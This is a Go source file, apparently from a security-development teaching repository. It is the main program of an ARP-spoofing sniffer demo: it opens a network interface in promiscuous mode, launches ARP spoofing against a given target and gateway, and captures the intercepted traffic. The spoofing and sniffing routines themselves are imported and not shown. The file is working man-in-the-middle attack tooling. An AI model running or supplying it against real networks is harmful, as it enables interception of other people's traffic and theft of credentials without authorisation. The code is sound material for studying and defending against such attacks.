package main

import (
	"fmt"
	"os"
	"time"

	"github.com/google/gopacket/pcap"

	"sec-dev-in-action-src/sniffer/arp_sniff_demo/arpspoof"
	"sec-dev-in-action-src/sniffer/arp_sniff_demo/logger"
	"sec-dev-in-action-src/sniffer/arp_sniff_demo/sniff"
)

var (
	snapshotLen int32 = 1024
	promiscuous bool  = true
	err         error
	timeout     time.Duration = pcap.BlockForever
	handle      *pcap.Handle

	DeviceName = "enp0s5"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Printf("%v deviceName target gateway\n", os.Args[0])
		os.Exit(0)
	}

	DeviceName = os.Args[1]
	target := os.Args[2]
	gateway := os.Args[3]

	handle, err = pcap.OpenLive(DeviceName, snapshotLen, promiscuous, timeout)
	if err != nil {
		logger.Log.Fatal(err)
	}
	defer handle.Close()

	go StartArp(handle, DeviceName, target, gateway)

	_ = sniff.StartSniff(handle)
}

func StartArp(handle *pcap.Handle, deviceName, target, gateway string) {
	arpspoof.ArpSpoof(deviceName, handle, target, gateway)
}
